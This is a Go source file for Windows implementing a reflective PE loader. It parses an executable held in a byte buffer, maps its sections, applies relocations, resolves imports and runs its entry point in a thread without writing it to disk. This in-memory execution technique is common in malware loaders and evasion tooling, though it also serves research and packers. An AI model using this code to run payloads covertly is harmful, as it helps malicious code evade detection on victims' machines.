//go:build windows

package main

import (
	"bytes"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"
)

const (
	IMAGE_FILE_MACHINE_AMD64 = 0x8664
	IMAGE_FILE_MACHINE_ARM64 = 0xAA64

	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_BASE_RELOCATION struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

type IMAGE_IMPORT_DESCRIPTOR struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

func sectionProtection(characteristics uint32) uint32 {
	exec := (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
	read := (characteristics & IMAGE_SCN_MEM_READ) != 0
	write := (characteristics & IMAGE_SCN_MEM_WRITE) != 0

	switch {
	case exec && write:
		return PAGE_EXECUTE_READWRITE
	case exec && read:
		return PAGE_EXECUTE_READ
	case exec:
		return PAGE_EXECUTE
	case write:
		return PAGE_READWRITE
	case read:
		return PAGE_READONLY
	default:
		return PAGE_NOACCESS
	}
}

func runPEInMemory(pe []byte) error {
	if len(pe) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
		return fmt.Errorf("payload too small")
	}

	// 1. Parse and validate DOS Header
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&pe[0]))
	if dosHeader.E_magic != 0x5A4D {
		return fmt.Errorf("invalid DOS magic")
	}
	if dosHeader.E_lfanew < 0 || int(dosHeader.E_lfanew)+int(unsafe.Sizeof(IMAGE_NT_HEADERS64{})) > len(pe) {
		return fmt.Errorf("invalid NT header offset")
	}

	// 2. Parse and validate NT Headers against host architecture
	ntHeaders := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&pe[dosHeader.E_lfanew]))
	if ntHeaders.Signature != 0x00004550 {
		return fmt.Errorf("invalid NT signature")
	}
	if ntHeaders.OptionalHeader.Magic != 0x20b {
		return fmt.Errorf("unsupported PE format (magic: 0x%x)", ntHeaders.OptionalHeader.Magic)
	}

	var expectedMachine uint16
	switch runtime.GOARCH {
	case "amd64":
		expectedMachine = IMAGE_FILE_MACHINE_AMD64
	case "arm64":
		expectedMachine = IMAGE_FILE_MACHINE_ARM64
	default:
		return fmt.Errorf("unsupported host architecture: %s", runtime.GOARCH)
	}

	if ntHeaders.FileHeader.Machine != expectedMachine {
		return fmt.Errorf("architecture mismatch: host is %s (0x%x), PE is 0x%x",
			runtime.GOARCH, expectedMachine, ntHeaders.FileHeader.Machine)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualFree := kernel32.NewProc("VirtualFree")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	LoadLibraryA := kernel32.NewProc("LoadLibraryA")
	GetProcAddress := kernel32.NewProc("GetProcAddress")
	FlushInstructionCache := kernel32.NewProc("FlushInstructionCache")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	CloseHandle := kernel32.NewProc("CloseHandle")

	// 3. Allocate RW memory for the entire image
	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)
	baseAddr, _, err := VirtualAlloc.Call(
		0,
		imageSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if baseAddr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}
	defer VirtualFree.Call(baseAddr, 0, MEM_RELEASE)

	// 4. Copy PE Headers
	headersSize := uintptr(ntHeaders.OptionalHeader.SizeOfHeaders)
	if int(headersSize) > len(pe) {
		return fmt.Errorf("invalid SizeOfHeaders")
	}
	destHeaders := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), headersSize)
	copy(destHeaders, pe[:headersSize])

	// 5. Copy Sections
	firstSection := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
		uintptr(unsafe.Pointer(&pe[dosHeader.E_lfanew])) + unsafe.Sizeof(IMAGE_NT_HEADERS64{}),
	))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		if section.SizeOfRawData == 0 {
			continue
		}
		if int(section.PointerToRawData+section.SizeOfRawData) > len(pe) {
			return fmt.Errorf("section %d exceeds payload bounds", i)
		}
		dest := baseAddr + uintptr(section.VirtualAddress)
		destSlice := unsafe.Slice((*byte)(unsafe.Pointer(dest)), section.SizeOfRawData)
		srcSlice := pe[section.PointerToRawData : section.PointerToRawData+section.SizeOfRawData]
		copy(destSlice, srcSlice)
	}

	// 6. Apply Base Relocations
	delta := uint64(baseAddr) - ntHeaders.OptionalHeader.ImageBase
	if delta != 0 {
		relocDir := ntHeaders.OptionalHeader.DataDirectory[5] // IMAGE_DIRECTORY_ENTRY_BASERELOC
		if relocDir.Size > 0 {
			relocAddr := baseAddr + uintptr(relocDir.VirtualAddress)
			relocEnd := relocAddr + uintptr(relocDir.Size)

			for relocAddr < relocEnd {
				block := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(relocAddr))
				if block.SizeOfBlock == 0 {
					break
				}
				numEntries := (block.SizeOfBlock - 8) / 2
				entryAddr := relocAddr + 8

				for i := uint32(0); i < numEntries; i++ {
					entry := *(*uint16)(unsafe.Pointer(entryAddr + uintptr(i)*2))
					typ := entry >> 12
					offset := entry & 0x0FFF

					switch typ {
					case 0: // IMAGE_REL_BASED_ABSOLUTE (padding)
						continue
					case 10: // IMAGE_REL_BASED_DIR64
						patchAddr := baseAddr + uintptr(block.VirtualAddress) + uintptr(offset)
						ptr := (*uint64)(unsafe.Pointer(patchAddr))
						*ptr += delta
					default:
						return fmt.Errorf("unsupported relocation type: %d", typ)
					}
				}
				relocAddr += uintptr(block.SizeOfBlock)
			}
		}
	}

	// 7. Resolve Imports
	importDir := ntHeaders.OptionalHeader.DataDirectory[1] // IMAGE_DIRECTORY_ENTRY_IMPORT
	if importDir.Size > 0 {
		importAddr := baseAddr + uintptr(importDir.VirtualAddress)
		for {
			descriptor := (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importAddr))
			if descriptor.Name == 0 {
				break
			}
			nameStart := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr+uintptr(descriptor.Name))), 256)
			nullIdx := bytes.IndexByte(nameStart, 0)
			if nullIdx <= 0 {
				return fmt.Errorf("invalid import DLL name")
			}
			dllName := string(nameStart[:nullIdx])
			dllNamePtr, _ := syscall.BytePtrFromString(dllName)

			hModule, _, err := LoadLibraryA.Call(uintptr(unsafe.Pointer(dllNamePtr)))
			if hModule == 0 {
				return fmt.Errorf("LoadLibraryA failed for %s: %w", dllName, err)
			}

			thunkAddr := baseAddr + uintptr(descriptor.FirstThunk)
			var origThunkAddr uintptr
			if descriptor.OriginalFirstThunk != 0 {
				origThunkAddr = baseAddr + uintptr(descriptor.OriginalFirstThunk)
			} else {
				origThunkAddr = thunkAddr
			}

			for {
				funcName := *(*uintptr)(unsafe.Pointer(origThunkAddr))
				if funcName == 0 {
					break
				}

				var procAddr uintptr
				if funcName&0x8000000000000000 != 0 {
					ordinal := uint16(funcName & 0xFFFF)
					procAddr, _, _ = GetProcAddress.Call(hModule, uintptr(ordinal))
				} else {
					nameBytes := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr+funcName+2)), 256)
					procAddr, _, _ = GetProcAddress.Call(hModule, uintptr(unsafe.Pointer(&nameBytes[0])))
				}
				if procAddr == 0 {
					return fmt.Errorf("GetProcAddress failed in %s", dllName)
				}

				*(*uintptr)(unsafe.Pointer(thunkAddr)) = procAddr
				thunkAddr += unsafe.Sizeof(uintptr(0))
				origThunkAddr += unsafe.Sizeof(uintptr(0))
			}
			importAddr += unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{})
		}
	}

	// 8. Apply per-section memory protections
	var oldProtect uint32
	VirtualProtect.Call(baseAddr, headersSize, PAGE_READONLY, uintptr(unsafe.Pointer(&oldProtect)))

	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		size := section.VirtualSize
		if size == 0 {
			size = section.SizeOfRawData
		}
		if size == 0 {
			continue
		}
		prot := sectionProtection(section.Characteristics)
		VirtualProtect.Call(
			baseAddr+uintptr(section.VirtualAddress),
			uintptr(size),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}

	// 9. Flush CPU Instruction Cache (required on ARM64, no-op on x64)
	hProc, _, _ := GetCurrentProcess.Call()
	FlushInstructionCache.Call(hProc, baseAddr, imageSize)

	// 10. Execute Entry Point
	entryPoint := baseAddr + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
	var threadId uint32
	hThread, _, err := CreateThread.Call(0, 0, entryPoint, 0, 0, uintptr(unsafe.Pointer(&threadId)))
	if hThread == 0 {
		return fmt.Errorf("CreateThread failed: %w", err)
	}
	defer CloseHandle.Call(hThread)

	WaitForSingleObject.Call(hThread, 0xFFFFFFFF)
	return nil
}
